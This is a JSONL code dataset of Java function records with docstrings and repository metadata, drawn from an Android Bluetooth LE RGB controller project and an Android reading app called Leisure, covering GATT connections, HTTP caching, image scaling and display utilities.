{"docstring": "/**\n * Request a read on a given {@code BluetoothGattCharacteristic}. The read result is reported\n * asynchronously through the {@code BluetoothGattCallback#onCharacteristicRead(android.bluetooth.BluetoothGatt, android.bluetooth.BluetoothGattCharacteristic, int)}\n * callback.\n *\n * @param characteristic The characteristic to read from.\n */\n", "func_signal": "public void readCharacteristic(BluetoothGattCharacteristic characteristic)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.readCharacteristic(characteristic);\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Connects to the GATT server hosted on the Bluetooth LE device.\n *\n * @param address The device address of the destination device.\n *\n * @return Return true if the connection is initiated successfully. The connection result\n *         is reported asynchronously through the\n *         {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n *         callback.\n */\n", "func_signal": "public boolean connect(final String address)", "code": "{\n    if (mBluetoothAdapter == null || address == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized or unspecified address.\");\n        return false;\n    }\n\n    // Previously connected device.  Try to reconnect.\n    if (mBluetoothDeviceAddress != null && address.equals(mBluetoothDeviceAddress)\n            && mBluetoothGatt != null) {\n        Log.d(TAG, \"Trying to use an existing mBluetoothGatt for connection.\");\n        if (mBluetoothGatt.connect()) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    final BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(address);\n    if (device == null) {\n        Log.w(TAG, \"Device not found.  Unable to connect.\");\n        return false;\n    }\n    // We want to directly connect to the device, so we are setting the autoConnect\n    // parameter to false.\n    mBluetoothGatt = device.connectGatt(this, false, mGattCallback);\n    Log.d(TAG, \"Trying to create a new connection.\");\n    mBluetoothDeviceAddress = address;\n    return true;\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * \u626b\u63cf\u84dd\u7259\u8bbe\u5907\n * @param enable \u662f\u5426\u626b\u63cf\n */\n", "func_signal": "private void scanLeDevice(final boolean enable)", "code": "{\n    if (enable) { //\u5f00\u59cb\u626b\u63cf\n        // 10s\u540e\u505c\u6b62\u626b\u63cf\n        mHandler.postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                mScanning = false;\n                mBluetoothAdapter.stopLeScan(mLeScanCallback);\n                invalidateOptionsMenu();//\u8fd9\u53e5\u4f1a\u8c03\u7528onCreateOptionsMenu\n                getActionBar().setTitle(R.string.app_name);\n            }\n        }, SCAN_PERIOD);\n\n        mScanning = true;\n        mBluetoothAdapter.startLeScan(mLeScanCallback);\n        getActionBar().setTitle(R.string.title_devices);\n    } else { //\u505c\u6b62\u626b\u63cf\n        mScanning = false;\n        mBluetoothAdapter.stopLeScan(mLeScanCallback);\n        getActionBar().setTitle(R.string.app_name);\n    }\n    invalidateOptionsMenu();\n}", "path": "book\\old\\android-adt\\code\\6.4\\BLECom\\src\\kalen\\app\\blecom\\ui\\DeviceScanActivity.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * \u7ed9BLE\u53d1\u9001RGB\u503c\n * @param R\n * @param G\n * @param B\n */\n", "func_signal": "private void sendRGBToBle(int R, int G, int B)", "code": "{\n\t//\u6ca1\u8fde\u63a5,\u76f4\u63a5\u8fd4\u56de\n\t\tif (!mConnected) {\n\t\t\tToast.makeText(DeviceControlActivity.this, \"\u8bbe\u5907\u5c1a\u672a\u8fde\u63a5\", \n\t\t\t\t\tToast.LENGTH_SHORT).show();\n\t\t\treturn;\n\t\t}\n\t\t\n\t\t//\u6ca1\u627e\u5230\u5bf9\u5e94\u7684\u7279\u5f81\u503c,\u76f4\u63a5\u8fd4\u56de\n\t\tif (mCharacteristic == null) {\n\t\t\tToast.makeText(DeviceControlActivity.this, \"\u6ca1\u6709\u627e\u5230\u5bf9\u5e94\u7684\u7279\u5f81\u503c,\u8bf7\u5c1d\u8bd5\u91cd\u65b0\u8fde\u63a5\", \n\t\t\t\t\tToast.LENGTH_SHORT).show();\n\t\t\treturn;\n\t\t}\n\t\t\n\t\tbyte[] datas = new byte[]{(byte) R, (byte) (G + 50), (byte) (B + 100)};\n\t\tmCharacteristic.setValue(datas);\n\t\tmBluetoothLeService.writeCharacteristic(mCharacteristic);\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\kalen\\app\\blecom\\ui\\DeviceControlActivity.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * After using a given BLE device, the app must call this method to ensure resources are\n * released properly.\n */\n", "func_signal": "public void close()", "code": "{\n    if (mBluetoothGatt == null) {\n        return;\n    }\n    mBluetoothGatt.close();\n    mBluetoothGatt = null;\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Disconnects an existing connection or cancel a pending connection. The disconnection result\n * is reported asynchronously through the\n * {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n * callback.\n */\n", "func_signal": "public void disconnect()", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.disconnect();\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Retrieves a list of supported GATT services on the connected device. This should be\n * invoked only after {@code BluetoothGatt#discoverServices()} completes successfully.\n *\n * @return A {@code List} of supported services.\n */\n", "func_signal": "public List<BluetoothGattService> getSupportedGattServices()", "code": "{\n    if (mBluetoothGatt == null) return null;\n\n    return mBluetoothGatt.getServices();\n}", "path": "book\\old\\android-adt\\code\\6.4\\BLECom\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Retrieves a list of supported GATT services on the connected device. This should be\n * invoked only after {@code BluetoothGatt#discoverServices()} completes successfully.\n *\n * @return A {@code List} of supported services.\n */\n", "func_signal": "public List<BluetoothGattService> getSupportedGattServices()", "code": "{\n    if (mBluetoothGatt == null) return null;\n\n    return mBluetoothGatt.getServices();\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Initializes a reference to the local Bluetooth adapter.\n *\n * @return Return true if the initialization is successful.\n */\n", "func_signal": "public boolean initialize()", "code": "{\n    // For API level 18 and above, get a reference to BluetoothAdapter through\n    // BluetoothManager.\n    if (mBluetoothManager == null) {\n        mBluetoothManager = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);\n        if (mBluetoothManager == null) {\n            Log.e(TAG, \"Unable to initialize BluetoothManager.\");\n            return false;\n        }\n    }\n\n    mBluetoothAdapter = mBluetoothManager.getAdapter();\n    if (mBluetoothAdapter == null) {\n        Log.e(TAG, \"Unable to obtain a BluetoothAdapter.\");\n        return false;\n    }\n\n    return true;\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Enables or disables notification on a give characteristic.\n *\n * @param characteristic Characteristic to act on.\n * @param enabled If true, enable notification.  False otherwise.\n */\n", "func_signal": "public void setCharacteristicNotification(BluetoothGattCharacteristic characteristic,\n                                          boolean enabled)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.setCharacteristicNotification(characteristic, enabled);\n\n    // This is specific to Heart Rate Measurement.\n    if (UUID_HEART_RATE_MEASUREMENT.equals(characteristic.getUuid())) {\n        BluetoothGattDescriptor descriptor = characteristic.getDescriptor(\n                UUID.fromString(SampleGattAttributes.CLIENT_CHARACTERISTIC_CONFIG));\n        descriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);\n        mBluetoothGatt.writeDescriptor(descriptor);\n    }\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Request a read on a given {@code BluetoothGattCharacteristic}. The read result is reported\n * asynchronously through the {@code BluetoothGattCallback#onCharacteristicRead(android.bluetooth.BluetoothGatt, android.bluetooth.BluetoothGattCharacteristic, int)}\n * callback.\n *\n * @param characteristic The characteristic to read from.\n */\n", "func_signal": "public void readCharacteristic(BluetoothGattCharacteristic characteristic)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.readCharacteristic(characteristic);\n}", "path": "book\\old\\android-adt\\code\\6.4\\BLECom\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * \u66f4\u65b0\u8fde\u63a5\u72b6\u6001\n * @param resourceId\n */\n", "func_signal": "private void updateConnectionState(final int resourceId)", "code": "{\n\tToast.makeText(this, getResources().getString(resourceId), \n\t\t\tToast.LENGTH_SHORT).show();\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\kalen\\app\\blecom\\ui\\DeviceControlActivity.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Connects to the GATT server hosted on the Bluetooth LE device.\n *\n * @param address The device address of the destination device.\n *\n * @return Return true if the connection is initiated successfully. The connection result\n *         is reported asynchronously through the\n *         {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n *         callback.\n */\n", "func_signal": "public boolean connect(final String address)", "code": "{\n    if (mBluetoothAdapter == null || address == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized or unspecified address.\");\n        return false;\n    }\n\n    // Previously connected device.  Try to reconnect.\n    if (mBluetoothDeviceAddress != null && address.equals(mBluetoothDeviceAddress)\n            && mBluetoothGatt != null) {\n        Log.d(TAG, \"Trying to use an existing mBluetoothGatt for connection.\");\n        if (mBluetoothGatt.connect()) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    final BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(address);\n    if (device == null) {\n        Log.w(TAG, \"Device not found.  Unable to connect.\");\n        return false;\n    }\n    // We want to directly connect to the device, so we are setting the autoConnect\n    // parameter to false.\n    mBluetoothGatt = device.connectGatt(this, false, mGattCallback);\n    Log.d(TAG, \"Trying to create a new connection.\");\n    mBluetoothDeviceAddress = address;\n    return true;\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Initializes a reference to the local Bluetooth adapter.\n *\n * @return Return true if the initialization is successful.\n */\n", "func_signal": "public boolean initialize()", "code": "{\n    // For API level 18 and above, get a reference to BluetoothAdapter through\n    // BluetoothManager.\n    if (mBluetoothManager == null) {\n        mBluetoothManager = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);\n        if (mBluetoothManager == null) {\n            Log.e(TAG, \"Unable to initialize BluetoothManager.\");\n            return false;\n        }\n    }\n\n    mBluetoothAdapter = mBluetoothManager.getAdapter();\n    if (mBluetoothAdapter == null) {\n        Log.e(TAG, \"Unable to obtain a BluetoothAdapter.\");\n        return false;\n    }\n\n    return true;\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Retrieves a list of supported GATT services on the connected device. This should be\n * invoked only after {@code BluetoothGatt#discoverServices()} completes successfully.\n *\n * @return A {@code List} of supported services.\n */\n", "func_signal": "public List<BluetoothGattService> getSupportedGattServices()", "code": "{\n    if (mBluetoothGatt == null) return null;\n\n    return mBluetoothGatt.getServices();\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * \u6784\u5efaIntentFilter\n * @return\n */\n", "func_signal": "private static IntentFilter makeGattUpdateIntentFilter()", "code": "{\n    final IntentFilter intentFilter = new IntentFilter();\n    intentFilter.addAction(BluetoothLeService.ACTION_DATA_AVAILABLE);\n    intentFilter.addAction(BluetoothLeService.ACTION_GATT_CONNECTED);\n    intentFilter.addAction(BluetoothLeService.ACTION_GATT_DISCONNECTED);\n    intentFilter.addAction(BluetoothLeService.ACTION_GATT_SERVICES_DISCOVERED);\n    return intentFilter;\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\kalen\\app\\blecom\\ui\\DeviceControlActivity.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * \u5f39\u56de\uff0c\u4e0d\u5173\u95ed\uff0c\u56e0\u4e3aleft\u662f0\uff0c\u6240\u4ee5setX\u548csetTranslationX\u6548\u679c\u662f\u4e00\u6837\u7684\n *\n * @param withVel \u4f7f\u7528\u8ba1\u7b97\u51fa\u6765\u7684\u65f6\u95f4\n */\n", "func_signal": "private void animateBack(boolean withVel)", "code": "{\n    cancelPotentialAnimation();\n    animator = ObjectAnimator.ofFloat(this, \"contentX\", getContentX(), 0);\n    int tmpDuration = withVel ? ((int) (duration * getContentX() / screenWidth)) : duration;\n    if (tmpDuration < 100) {\n        tmpDuration = 100;\n    }\n    animator.setDuration(tmpDuration);\n    animator.setInterpolator(new DecelerateInterpolator());\n    animator.start();\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\ui\\support\\SwipeBackActivity.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n*\u89e3\u6790\u6570\u636e\uff0c\u5e76\u628a\u89e3\u6790\u5f97\u5230\u7684\u6700\u7ec8\u7684\u5b57\u7b26\u4e32\u653e\u5165endStr\u4e2d\n*@author KevinWu\n*create at 2016/2/14 21:21\n*/\n", "func_signal": "private void parseData()", "code": "{\n    String first_cut[]=parseStr.split(STR_CUT_LEFT);\n    if(first_cut.length>1){\n        String second_cut[]=first_cut[1].split(STR_CUT_RIGHT);\n        if(second_cut.length>1){\n            endStr=STR_CUT_LEFT+second_cut[0]+\"</div>\";\n        }else{\n            Log.e(\"ERROR\", \"\u7b2c\u4e8c\u6b21\u89e3\u6790\u51fa\u9519\uff0c\u672a\u627e\u5230\u6709\u6548\u5206\u5272\u5143\u7d20\");\n        }\n    }else{\n        Log.e(\"ERROR\",\"\u7b2c\u4e00\u6b21\u89e3\u6790\u51fa\u9519\uff0c\u672a\u627e\u5230\u6709\u6548\u5206\u5272\u5143\u7d20\");\n    }\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\parser\\ScienceContentParser.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece dp \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a px(\u50cf\u7d20)\n */\n", "func_signal": "public static int dip2px(Context context, float dpValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (dpValue * scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\DisplayUtil.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "//\u5c06\u5934\u50cf\u6309\u6bd4\u4f8b\u7f29\u653e\n", "func_signal": "private static Bitmap scaleBitmap(Bitmap bitmap)", "code": "{\n    int width = bitmap.getWidth();\n    //\u4e00\u5b9a\u8981\u5f3a\u8f6c\u6210float \u4e0d\u7136\u6709\u53ef\u80fd\u56e0\u4e3a\u7cbe\u5ea6\u4e0d\u591f \u51fa\u73b0 scale\u4e3a0 \u7684\u9519\u8bef\n    float scale = (float)width/(float)bitmap.getWidth();\n    Matrix matrix = new Matrix();\n    matrix.postScale(scale, scale);\n    return Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);\n\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\ImageUtil.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "// load today's data\n", "func_signal": "public void load()", "code": "{\n    Request.Builder builder = new Request.Builder();\n    builder.url(DailyApi.daily_url);\n    Request request = builder.build();\n    HttpUtil.enqueue(request, new Callback() {\n        @Override\n        public void onFailure(Request request, IOException e) {\n            mHandler.sendEmptyMessage(CONSTANT.ID_FAILURE);\n        }\n        @Override\n        public void onResponse(Response response) throws IOException {\n            if(response.isSuccessful() == false) {\n                mHandler.sendEmptyMessage(CONSTANT.ID_FAILURE);\n                return;\n            }\n            String res = response.body().string();\n\n            ArrayList<String> collectionTitles = new ArrayList<String>();\n            for(int i = 0 ; i<mList.size() ; i++ ){\n                if(mList.get(i).isCollected() == 1){\n                    collectionTitles.add(mList.get(i).getTitle());\n                }\n            }\n\n            List<StoryBean> oldList = new ArrayList<StoryBean>();\n            List<StoryBean> newList = new ArrayList<StoryBean>();\n\n            for(StoryBean storyBean:mList){\n                oldList.add(storyBean);\n            }\n\n            Gson gson = new Gson();\n            DailyBean dailyBean = gson.fromJson(res, DailyBean.class);\n            StoryBean[] storyBeans = dailyBean.getStories();\n            for (StoryBean storyBeen : storyBeans) {\n                newList.add(storyBeen);\n            }\n\n            loadOld(dailyBean.getDate(),oldList,newList);\n\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\database\\cache\\cache\\DailyCache.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece px(\u50cf\u7d20) \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a dp\n */\n", "func_signal": "public static int px2dip(Context context, float pxValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (pxValue / scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\DisplayUtil.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * Static Method get news titles <br>\n * <p>Get news titles from file raw/news_api.txt. titles are written in Chinese,don't\n * support local. <br>\n *\n * @return String []\n */\n", "func_signal": "public static String[] getNewsTitle()", "code": "{\n    if (newsTitle == null) {\n        if (document == null) {\n            InputStream is = Utils.readFileFromRaw(R.raw.news_api);\n            document = Utils.getDocmentByIS(is);\n        }\n        NodeList titleList = document.getElementsByTagName(\"name\");\n        newsTitle = new String[titleList.getLength()];\n        for (int i = 0; i < titleList.getLength(); i++) {\n            newsTitle[i] = titleList.item(i).getTextContent();\n        }\n    }\n    return newsTitle;\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\api\\NewsApi.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * \u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u7684\u4eae\u5ea6\u503c:0~255\n */\n", "func_signal": "public static void setSysScreenBrightness(int brightness)", "code": "{\n    try {\n        ContentResolver resolver = mContext.getContentResolver();\n        Uri uri = android.provider.Settings.System.getUriFor(android.provider.Settings.System.SCREEN_BRIGHTNESS);\n        android.provider.Settings.System.putInt(resolver, android.provider.Settings.System.SCREEN_BRIGHTNESS, brightness);\n        resolver.notifyChange(uri, null); // \u5b9e\u65f6\u901a\u77e5\u6539\u53d8\n    } catch (Exception e) {\n        Utils.DLog(\"\u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u7684\u4eae\u5ea6\u503c\u5931\u8d25\uff1a\"+e);\n    }\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\Utils.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * \u8bbe\u7f6e\u5e03\u5c40\u80cc\u666f\uff0c\u5176\u5b9e\u5c31\u662f\u8fb9\u7f18\u7a7a\u9699\u7684\u989c\u8272\uff0c\u989c\u8272\u53d6\u81ea\u9876\u90e8\u56fe\u7247\u7684\u4e3b\u8272\u8c03\n *\n * @param url\n */\n", "func_signal": "protected void setMainContentBg(final String url)", "code": "{\n    if (Utils.hasString(url) == false) {\n        setDefaultColor();\n        return;\n    }\n\n    Request.Builder builder = new Request.Builder();\n    builder.url(url);\n    Request request = builder.build();\n\n    HttpUtil.enqueue(request, new Callback() {\n        @Override\n        public void onFailure(Request request, IOException e) {\n            new Handler(Looper.getMainLooper()).post(new Runnable() {\n\n                @Override\n                public void run() {\n                    Log.d(TAG, \"onFailure: \"+ url);\n                    setDefaultColor();\n                }\n            });\n        }\n        @Override\n        public void onResponse(Response response) throws IOException {\n            final Bitmap bitmap = BitmapFactory.decodeStream(response.body().byteStream());\n            new Handler(Looper.getMainLooper()).post(new Runnable() {\n                @Override\n                public void run() {\n                    if(bitmap == null){\n                        setDefaultColor();\n                        Log.d(TAG, \"onResponse bitmap null: \" + url);\n                        return;\n                    }\n                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN){\n                        topImage.setBackground(new BitmapDrawable(getResources(), bitmap));\n                    } else{\n                        topImage.setImageURI(Uri.parse(url));\n                    }\n                    Log.d(TAG, \"onResponse: \" + url);\n                    mainContent.setBackgroundColor(ImageUtil.getImageColor(bitmap));\n                    progressBarTopPic.setVisibility(View.GONE);\n                }\n            });\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\ui\\support\\BaseDetailsActivity.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "//\u5df2\u89e3\u6790\u5b57\u7b26\u4e32\n", "func_signal": "public ScienceContentParser(String parseStr)", "code": "{\n        this.parseStr=parseStr;\n        parseData();\n    }", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\parser\\ScienceContentParser.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "// Must be called before setContentView()\n", "func_signal": "public static void changeLanguage(Context context, int lang)", "code": "{\n    String language = null;\n    String country = null;\n\n    switch (lang) {\n        case 1:\n            language = \"zh\";\n            country = \"CN\";\n            break;\n        default:\n            language = \"en\";\n            country = \"US\";\n            break;\n    }\n\n    Locale locale = new Locale(language, country);\n    Configuration conf = context.getResources().getConfiguration();\n    conf.locale = locale;\n    context.getApplicationContext().getResources().updateConfiguration(conf, context.getResources().getDisplayMetrics());\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\Utils.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * \u5f00\u542f\u5f02\u6b65\u7ebf\u7a0b\u8bbf\u95ee\u7f51\u7edc, \u4e14\u4e0d\u5728\u610f\u8fd4\u56de\u7ed3\u679c\uff08\u5b9e\u73b0\u7a7acallback\uff09\n * @param request\n */\n", "func_signal": "public static void enqueue(Request request)", "code": "{\n    mOkHttpClient.newCall(request).enqueue(new Callback() {\n\n        @Override\n        public void onResponse(Response arg0) throws IOException {\n\n        }\n\n        @Override\n        public void onFailure(Request arg0, IOException arg1) {\n\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\HttpUtil.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * Get details of book ,it contains Book Summary, Book Contents and Author Introduction<br>\n * if api does provide any info ,it will return a \"\" string\n *\n * @param position position of tab.\n */\n", "func_signal": "public static String getBookInfo(int position, BookBean book)", "code": "{\n    switch (position) {\n        case 0:\n            if (Utils.hasString(book.getSummary()) == false) {\n                break;\n            }\n            return book.getSummary();\n        case 1:\n            if (Utils.hasString(book.getCatalog()) == false) {\n                break;\n            }\n            return book.getCatalog();\n        case 2:\n            if (Utils.hasString(book.getAuthor_intro()) == false) {\n                break;\n            }\n            return book.getAuthor_intro();\n    }\n    return LeisureApplication.AppContext.getString(R.string.text_noinfo);\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\api\\ReadingApi.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "//\u5c06\u539f\u59cb\u56fe\u50cf\u88c1\u526a\u6210\u6b63\u65b9\u5f62\n", "func_signal": "private static Bitmap dealRawBitmap(Bitmap bitmap)", "code": "{\n    int width = bitmap.getWidth();\n    int height = bitmap.getHeight();\n    //\u83b7\u53d6\u5bbd\u5ea6\n    int minWidth = width > height ?  height:width ;\n    //\u8ba1\u7b97\u6b63\u65b9\u5f62\u7684\u8303\u56f4\n    int leftTopX = (width - minWidth)/2;\n    int leftTopY = (height - minWidth)/2;\n    //\u88c1\u526a\u6210\u6b63\u65b9\u5f62\n    Bitmap newBitmap = Bitmap.createBitmap(bitmap,leftTopX,leftTopY,minWidth,minWidth,null,false);\n    return  scaleBitmap(newBitmap);\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\ImageUtil.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "// load yesterday's data\n", "func_signal": "private  void loadOld(String date, final List<StoryBean> oldList, final List<StoryBean> newList)", "code": "{\n    Request.Builder builder = new Request.Builder();\n    builder.url(DailyApi.daily_old_url + date);\n    Request request = builder.build();\n    HttpUtil.enqueue(request, new Callback() {\n        @Override\n        public void onFailure(Request request, IOException e) {\n            mHandler.sendEmptyMessage(CONSTANT.ID_FAILURE);\n        }\n        @Override\n        public void onResponse(Response response) throws IOException {\n            if(response.isSuccessful() == false) {\n                mHandler.sendEmptyMessage(CONSTANT.ID_FAILURE);\n                return;\n            }\n            String res = response.body().string();\n\n            ArrayList<Integer> collectionIDs = new ArrayList<Integer>();\n            for(int i = 0 ; i<oldList.size() ; i++ ){\n                if(oldList.get(i).isCollected() == 1){\n                    collectionIDs.add(oldList.get(i).getId());\n                }\n            }\n\n            // clear old data\n            mList.clear();\n\n\n            Gson gson = new Gson();\n            StoryBean[] storyBeans = (gson.fromJson(res, DailyBean.class)).getStories();\n            for (StoryBean storyBeen : storyBeans) {\n                newList.add(storyBeen);\n            }\n\n            for(StoryBean storyBean: newList){\n                mList.add(storyBean);\n            }\n\n            // setCollection flag\n            for(Integer id:collectionIDs){\n                for(int i=0 ; i<mList.size() ; i++){\n                    if(id.equals(mList.get(i).getId())){\n                        mList.get(i).setCollected(1);\n                    }\n                }\n            }\n\n            // notify\n            mHandler.sendEmptyMessage(CONSTANT.ID_SUCCESS);\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\database\\cache\\cache\\DailyCache.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "// convert InputStream to String\n", "func_signal": "public static String getStringFromInputStream(InputStream is)", "code": "{\n\n    BufferedReader br = null;\n    StringBuilder sb = new StringBuilder();\n\n    String line;\n    try {\n\n        br = new BufferedReader(new InputStreamReader(is));\n        while ((line = br.readLine()) != null) {\n            sb.append(line);\n        }\n\n    } catch (IOException e) {\n        e.printStackTrace();\n    } finally {\n        if (br != null) {\n            try {\n                br.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    return sb.toString();\n\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\support\\Utils.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
